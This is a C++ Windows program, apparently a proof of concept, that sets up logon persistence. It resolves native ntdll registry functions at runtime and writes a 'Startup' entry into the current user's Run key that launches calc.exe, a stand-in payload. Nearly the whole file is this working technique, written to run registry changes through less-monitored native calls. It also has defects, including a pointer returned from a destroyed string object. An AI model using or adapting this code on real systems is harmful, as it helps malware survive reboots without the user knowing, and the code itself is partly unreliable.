#include <windows.h>
#include <iostream>
#include <vector>
#include <Sddl.h>
#include <atlstr.h>
#include <tchar.h>

#include "utils.h"

SIZE_T StringLengthW(_In_ LPCWSTR String)
{
	LPCWSTR String2;

	for (String2 = String; *String2; ++String2);

	return (String2 - String);
}

VOID RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString)
{
	SIZE_T DestSize;

	if (SourceString)
	{
		DestSize = StringLengthW(SourceString) * sizeof(WCHAR);
		DestinationString->Length = (USHORT)DestSize;
		DestinationString->MaximumLength = (USHORT)DestSize + sizeof(WCHAR);
	}
	else
	{
		DestinationString->Length = 0;
		DestinationString->MaximumLength = 0;
	}

	DestinationString->Buffer = (PWCHAR)SourceString;
}

LPCWSTR GetCurrentUserSID()
{
	HANDLE hToken = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		printf("[-] Couldn't open process token: %d\n", GetLastError());
		return NULL;
	}

	DWORD dwBuffer = 0;
	if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwBuffer) && (GetLastError() != ERROR_INSUFFICIENT_BUFFER))
	{
		printf("[-] GetTokenInformation failed: %d\n", GetLastError());
		CloseHandle(hToken);
		return NULL;
	}

	std::vector<BYTE> buffer;
	buffer.resize(dwBuffer);
	PTOKEN_USER pToken = reinterpret_cast<PTOKEN_USER>(&buffer[0]);

	if (!GetTokenInformation(hToken, TokenUser, pToken, dwBuffer, &dwBuffer))
	{
		printf("[-] GetTokenInformation failed: %d\n", GetLastError());
		CloseHandle(hToken);
		return NULL;
	}

	if (!IsValidSid(pToken->User.Sid))
	{
		printf("[-] SID is invalid\n");
		CloseHandle(hToken);
		return NULL;
	}

	LPTSTR lID = NULL;
	if (!ConvertSidToStringSid(pToken->User.Sid, &lID))
	{
		printf("[-] Couldn't convert SID to string\n");
		CloseHandle(hToken);
		return NULL;
	}

	CString strSID(lID);
	LocalFree(lID);

	return strSID.GetString();
}

int main(void)
{
	UNICODE_STRING key_path, name;
	OBJECT_ATTRIBUTES obj{};
	HANDLE hKey = NULL;
	NTSTATUS status;
	const wchar_t exe[] = L"C:\\Windows\\System32\\calc.exe";

	HMODULE ntdll = LoadLibraryA("ntdll.dll");
	if (!ntdll)
	{
		printf("[-] Couldn't load NTDLL.DLL: (%d)\n", GetLastError());
		return -1;
	}

	LPVOID open_key = GetProcAddress(ntdll, "NtOpenKey");
	LPVOID close_key = GetProcAddress(ntdll, "NtClose");
	LPVOID set_key = GetProcAddress(ntdll, "NtSetValueKey");

	if (open_key == NULL)
	{
		printf("[-] Couldn't get address to NtOpenKey()\n");
		return -1;
	} 
	if (close_key == NULL)
	{
		printf("[-] Couldn't get address to NtClose()\n");
		return -1;
	}
	if (set_key == NULL)
	{
		printf("[-] Couldn't get address to NtSetValueKey()\n");
		return -1;
	}

	printf("[+] Got address to NtOpenKey(): 0x%x, NtClose(): 0x%x, NtSetValueKey(): 0x%x\n",
		open_key, close_key, set_key);

	NtOpenKey func_open_key = (NtOpenKey)open_key;
	NtClose func_query_key = (NtClose)close_key;
	NtSetValueKey func_set_key = (NtSetValueKey)set_key;

	LPCWSTR SID = GetCurrentUserSID();
	if (SID == NULL)
	{
		printf("[-] Couldn't get SID\n");
		return NULL;
	}

	std::wstring path = std::wstring(L"\\Registry\\USER\\") + std::wstring(SID) + std::wstring(L"\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
	RtlInitUnicodeString(&key_path, path.c_str());
	InitializeObjectAttributes(&obj, &key_path, OBJ_CASE_INSENSITIVE, NULL, NULL);

	status = func_open_key(&hKey, MAXIMUM_ALLOWED, &obj);
	if (!NT_SUCCESS(status))
	{
		printf("[-] NtOpenKey failed status: %lx\n", status);
		return -1;
	}
	printf("[+] Handle to key: (0x%x)\n", (int)hKey);

	RtlInitUnicodeString(&name, L"Startup");
	status = func_set_key(hKey, &name, 0, REG_SZ, (PVOID)exe, sizeof(exe));

	if (!NT_SUCCESS(status))
	{
		printf("[-] Couldn't set key: (%lx)\n", status);
		NtClose(hKey);
		return -1;
	}

	printf("[+] Set key\n");
	
	NtClose((HANDLE)hKey);
	return 0;
}